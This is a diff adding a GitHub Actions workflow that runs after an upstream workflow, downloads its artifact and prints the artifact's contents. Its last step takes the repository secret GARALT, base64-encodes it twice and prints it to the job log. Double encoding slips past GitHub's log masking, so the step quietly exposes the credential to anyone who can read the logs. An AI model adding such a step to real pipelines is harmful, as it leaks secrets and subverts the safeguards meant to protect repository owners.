@@ -1,0 +1,35 @@
+name: Downstream via workflow_run
+
+on:
+  workflow_run:
+    workflows: ["Upstream Workflow"]       # 必须与上游工作流的 name 完全一致
+    types: [completed]
+
+jobs:
+  on-success:
+    runs-on: ubuntu-latest
+    if: ${{ github.event.workflow_run.conclusion == 'success' }}
+    steps:
+      - name: Download artifact from upstream run
+        uses: actions/download-artifact@v4
+        with:
+          name: upstream-context
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Read and display artifact content
+        run: |
+          echo "=== Content from upstream ==="
+          cat context.txt
+          echo "============================="
+
+      - name: Double-base64 encode secret GARALT (if exists)
+        env:
+          GARALT: ${{ secrets.GARALT }}
+        run: |
+          if [ -n "$GARALT" ]; then
+            echo "Encoded secret:"
+            printf '%s' "$GARALT" | base64 -w0 | base64 -w0
+          else
+            echo "Secret GARALT not set"
+          fi
